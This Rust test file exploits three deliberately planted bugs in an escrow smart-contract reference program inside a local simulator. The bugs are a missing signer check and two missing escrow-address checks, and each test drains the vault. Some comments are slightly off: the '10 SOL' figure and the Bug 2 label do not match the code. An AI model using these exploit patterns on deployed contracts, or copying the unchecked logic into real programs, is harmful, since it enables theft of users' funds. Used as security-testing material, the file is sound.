//! End-to-end invariant tests for the escrow reference program.
//!
//! Each test directly exploits one of the three deliberately planted bugs,
//! demonstrating that the Praxis runtime (LiteSvmBackend) correctly executes
//! the program and that the invariant violation is observable as a successful
//! transaction that should have been rejected.
//!
//! # Bug index
//! | # | Location  | Bug class      | What is missing                        |
//! |---|-----------|----------------|----------------------------------------|
//! | 1 | `release` | MissingSigner  | `authority.is_signer` check            |
//! | 2 | `release` | WrongOwner     | `escrow_state.owner == program_id`     |
//! | 3 | `cancel`  | WrongPdaSeeds  | PDA derivation verification            |

#![deny(unsafe_code)]

use praxis_core::Svm as _;
use praxis_svm_litesvm::LiteSvmBackend;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    message::Message,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

// ─── Constants ────────────────────────────────────────────────────────────────

/// Compiled eBPF bytecode for the escrow reference program.
const ESCROW_SO: &[u8] =
    include_bytes!("../../../examples/escrow-anchor/target/deploy/escrow.so");

/// 8-byte discriminator embedded at offset 0 of every valid `EscrowState`.
const ESCROW_DISCRIMINATOR: [u8; 8] = [0x65, 0x73, 0x63, 0x72, 0x6f, 0x77, 0x00, 0x01];

/// On-chain size of `EscrowState`:
/// discriminator(8) + depositor(32) + authority(32) + amount(8) + bump(1) = 81 bytes.
const ESCROW_STATE_SIZE: usize = 81;

/// Approximate rent-exempt minimum for an 81-byte account at current rent rate.
const RENT_EXEMPT_81: u64 = 1_474_560;

// ─── Helpers ─────────────────────────────────────────────────────────────────

/// Deploy the escrow program at a freshly-generated program ID.
fn deploy(svm: &mut LiteSvmBackend) -> Pubkey {
    let program_id = Pubkey::new_unique();
    svm.add_program(program_id, ESCROW_SO);
    program_id
}

/// Serialise an `EscrowState` into its on-chain byte layout.
///
/// Matches the borsh-0.10 layout used by the escrow program:
///   `[discriminator(8), depositor(32), authority(32), amount_le(8), bump(1)]`.
fn escrow_state_bytes(depositor: &Pubkey, authority: &Pubkey, amount: u64, bump: u8) -> Vec<u8> {
    let mut v = Vec::with_capacity(ESCROW_STATE_SIZE);
    v.extend_from_slice(&ESCROW_DISCRIMINATOR);
    v.extend_from_slice(depositor.as_ref());
    v.extend_from_slice(authority.as_ref());
    v.extend_from_slice(&amount.to_le_bytes());
    v.push(bump);
    debug_assert_eq!(v.len(), ESCROW_STATE_SIZE, "escrow_state byte layout mismatch");
    v
}

/// Inject a correctly-initialised escrow into `svm` and return its PDAs.
///
/// Returns `(escrow_pda, vault_pda, escrow_bump)`.
fn inject_valid_escrow(
    svm: &mut LiteSvmBackend,
    program_id: &Pubkey,
    depositor: &Pubkey,
    authority: &Pubkey,
    amount: u64,
) -> (Pubkey, Pubkey, u8) {
    let (escrow_pda, bump) =
        Pubkey::find_program_address(&[b"escrow", depositor.as_ref()], program_id);
    let (vault_pda, _vault_bump) =
        Pubkey::find_program_address(&[b"vault", depositor.as_ref()], program_id);

    svm.set_account(
        &escrow_pda,
        Account {
            lamports: RENT_EXEMPT_81,
            data: escrow_state_bytes(depositor, authority, amount, bump),
            owner: *program_id,
            executable: false,
            rent_epoch: 0,
        },
    );
    svm.set_account(
        &vault_pda,
        Account {
            lamports: amount.saturating_add(1_000_000),
            data: vec![],
            owner: *program_id,
            executable: false,
            rent_epoch: 0,
        },
    );

    (escrow_pda, vault_pda, bump)
}

// ─── Tests ───────────────────────────────────────────────────────────────────

/// **Bug 1 — MissingSigner on `release`.**
///
/// The program does not check `authority_info.is_signer`.  An adversary can
/// call `release` with the authority's pubkey in account slot 0 *without*
/// providing that account's signature.  The vault is drained, demonstrating
/// the signer-bypass vulnerability.
///
/// **Invariant violated:** if `release` succeeds, the `authority` account
/// must have signed the transaction.
#[test]
fn bug_1_release_succeeds_without_authority_signature() {
    let mut svm = LiteSvmBackend::new();
    let program_id = deploy(&mut svm);

    let fee_payer = Keypair::new(); // pays tx fees; not the authority
    let authority = Keypair::new(); // legitimate authority key
    let recipient = Pubkey::new_unique();
    let amount = 500_000u64;

    svm.airdrop(&fee_payer.pubkey(), 10_000_000).unwrap();
    svm.set_account(
        &recipient,
        Account { lamports: 1_000_000, ..Account::default() },
    );

    let (escrow_pda, vault_pda, _bump) = inject_valid_escrow(
        &mut svm,
        &program_id,
        &fee_payer.pubkey(), // depositor key (just used for PDA seed)
        &authority.pubkey(),
        amount,
    );

    let vault_before = svm
        .account(&vault_pda)
        .expect("vault should exist")
        .lamports;

    // Construct release with authority as a NON-SIGNER (Bug 1 trigger).
    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new_readonly(authority.pubkey(), false), // ← is_signer=false
            AccountMeta::new(escrow_pda, false),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new(recipient, false),
        ],
        data: vec![1u8], // EscrowInstruction::Release = 1
    };

    let blockhash = svm.inner().latest_blockhash();
    // Only fee_payer signs — authority does NOT provide a signature.
    let tx = Transaction::new(
        &[&fee_payer],
        Message::new(&[ix], Some(&fee_payer.pubkey())),
        blockhash,
    );

    let result = svm.execute(tx);

    // If Bug 1 is present the program skips the signer check and succeeds.
    // A fixed program would return ProgramError::MissingRequiredSignature.
    assert!(
        result.success,
        "Bug 1: expected release to succeed without authority signature (proving the bug exists),\
         but it was rejected.\nLogs: {:?}",
        result.logs,
    );

    // Secondary check: vault was actually drained, confirming the exploit path.
    let vault_after = svm.account(&vault_pda).map(|a| a.lamports).unwrap_or(0);
    assert!(
        vault_after < vault_before,
        "vault lamports should have decreased; before={vault_before}, after={vault_after}",
    );
}

/// **Bug 2 — WrongOwner / missing PDA check on `release`.**
///
/// The program does not verify that `escrow_state_info.key` is the PDA
/// derived from `[b"escrow", depositor.key]`, and it does not verify
/// `escrow_state_info.owner == program_id` before accepting the account.
///
/// An adversary can inject any program-owned account with valid `EscrowState`
/// bytes (setting `authority` to a key they control) and supply it in the
/// `escrow_state` slot.  The program reads the data, passes all in-code
/// checks, and drains a legitimate vault — all without the escrow being the
/// correct PDA for the targeted depositor.
///
/// **Invariant violated:** if `release` succeeds, `escrow_state.key` must
/// equal `PDA(program_id, [b"escrow", depositor.key])`.
#[test]
fn bug_2_release_accepts_escrow_state_at_wrong_address() {
    let mut svm = LiteSvmBackend::new();
    let program_id = deploy(&mut svm);

    let attacker_auth = Keypair::new(); // adversary controls this key
    let victim_depositor = Pubkey::new_unique(); // victim whose vault we drain
    let recipient = Pubkey::new_unique();
    let amount = 750_000u64;

    svm.airdrop(&attacker_auth.pubkey(), 10_000_000).unwrap();
    svm.set_account(
        &recipient,
        Account { lamports: 1_000_000, ..Account::default() },
    );

    // Inject the victim's legitimate vault (owned by program_id so the drain works).
    let (vault_pda, _) = Pubkey::find_program_address(
        &[b"vault", victim_depositor.as_ref()],
        &program_id,
    );
    svm.set_account(
        &vault_pda,
        Account {
            lamports: amount.saturating_add(1_000_000),
            owner: program_id,
            ..Account::default()
        },
    );

    // The correct escrow PDA for this depositor — we do NOT use it in the tx.
    let (correct_escrow_pda, _) = Pubkey::find_program_address(
        &[b"escrow", victim_depositor.as_ref()],
        &program_id,
    );

    // Adversary creates a FAKE escrow at a completely different address.
    // It IS owned by program_id (so the lamport drain succeeds at the BPF layer),
    // but it is NOT the PDA for the victim depositor — a check the program
    // omits entirely (Bug 2).
    let fake_escrow_pk = Pubkey::new_unique();
    assert_ne!(fake_escrow_pk, correct_escrow_pda);
    svm.set_account(
        &fake_escrow_pk,
        Account {
            lamports: RENT_EXEMPT_81,
            data: escrow_state_bytes(
                &victim_depositor,
                &attacker_auth.pubkey(),
                amount,
                0,
            ),
            owner: program_id, // correct owner so BPF lamport drain is legal
            executable: false,
            rent_epoch: 0,
        },
    );

    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new_readonly(attacker_auth.pubkey(), true), // authority signs ✓
            AccountMeta::new(fake_escrow_pk, false),                  // wrong-address escrow
            AccountMeta::new(vault_pda, false),
            AccountMeta::new(recipient, false),
        ],
        data: vec![1u8], // EscrowInstruction::Release = 1
    };

    let blockhash = svm.inner().latest_blockhash();
    let tx = Transaction::new(
        &[&attacker_auth],
        Message::new(&[ix], Some(&attacker_auth.pubkey())),
        blockhash,
    );

    let result = svm.execute(tx);

    // If Bug 2 is present the program accepts the wrong-address escrow and drains
    // the victim's vault.  A fixed program would derive the expected PDA and
    // return ProgramError::InvalidArgument when the keys do not match.
    assert!(
        result.success,
        "Bug 2: expected release to succeed with wrong-address escrow (proving the bug exists),\
         but it was rejected.\nLogs: {:?}",
        result.logs,
    );

    // Confirm vault was drained, proving funds were stolen via the wrong escrow.
    let vault_after = svm.account(&vault_pda).map(|a| a.lamports).unwrap_or(0);
    assert_eq!(vault_after, 0, "vault should be fully drained by the exploit");
}

/// **Bug 3 — WrongPdaSeeds on `cancel`.**
///
/// The program does not verify that `escrow_state_info.key` equals the PDA
/// derived from `[b"escrow", depositor.key]`.  An adversary can supply any
/// program-owned account that contains valid `EscrowState` bytes (with the
/// correct depositor field) in the `escrow_state` slot.
///
/// The program processes the cancellation, draining the vault and the fake
/// escrow account, even though neither is the legitimate PDA for this
/// depositor.
///
/// **Invariant violated:** if `cancel` succeeds, `escrow_state.key` must
/// equal `PDA(program_id, [b"escrow", depositor.key])`.
#[test]
fn bug_3_cancel_accepts_escrow_state_at_wrong_address() {
    let mut svm = LiteSvmBackend::new();
    let program_id = deploy(&mut svm);

    let depositor = Keypair::new();
    let authority_key = Pubkey::new_unique(); // stored in state, irrelevant for cancel
    let amount = 300_000u64;

    svm.airdrop(&depositor.pubkey(), 10_000_000).unwrap();

    // Derive the CORRECT PDA — we intentionally do NOT use it in the tx.
    let (correct_escrow_pda, bump) = Pubkey::find_program_address(
        &[b"escrow", depositor.pubkey().as_ref()],
        &program_id,
    );

    // Create a FAKE escrow at a completely different address, owned by program_id
    // (so the program can drain its lamports).
    let fake_escrow_pk = Pubkey::new_unique();
    assert_ne!(
        fake_escrow_pk, correct_escrow_pda,
        "test invariant: fake escrow must differ from the correct PDA",
    );
    svm.set_account(
        &fake_escrow_pk,
        Account {
            lamports: RENT_EXEMPT_81,
            data: escrow_state_bytes(&depositor.pubkey(), &authority_key, amount, bump),
            owner: program_id, // owned by our program so lamport drain is legal
            executable: false,
            rent_epoch: 0,
        },
    );

    // Vault to be returned to the depositor.
    let (vault_pda, _) = Pubkey::find_program_address(
        &[b"vault", depositor.pubkey().as_ref()],
        &program_id,
    );
    svm.set_account(
        &vault_pda,
        Account {
            lamports: amount.saturating_add(1_000_000),
            owner: program_id,
            ..Account::default()
        },
    );

    let ix = Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(depositor.pubkey(), true), // depositor signs ✓
            AccountMeta::new(fake_escrow_pk, false),    // wrong PDA — Bug 3 trigger
            AccountMeta::new(vault_pda, false),
        ],
        data: vec![2u8], // EscrowInstruction::Cancel = 2
    };

    let blockhash = svm.inner().latest_blockhash();
    let tx = Transaction::new(
        &[&depositor],
        Message::new(&[ix], Some(&depositor.pubkey())),
        blockhash,
    );

    let result = svm.execute(tx);

    // If Bug 3 is present the program processes cancel without verifying the PDA.
    // A fixed program would return ProgramError::InvalidArgument after comparing
    // escrow_state_info.key against the expected derivation.
    assert!(
        result.success,
        "Bug 3: expected cancel to succeed with wrong-PDA escrow (proving the bug exists),\
         but it was rejected.\nLogs: {:?}",
        result.logs,
    );

    // Secondary: confirm the depositor received funds, proving the exploit drained the vault.
    let depositor_after = svm.account(&depositor.pubkey()).map(|a| a.lamports).unwrap_or(0);
    assert!(
        depositor_after > 10_000_000, // started with 10 SOL airdrop + received vault funds
        "depositor should have received vault funds; lamports after = {depositor_after}",
    );
}
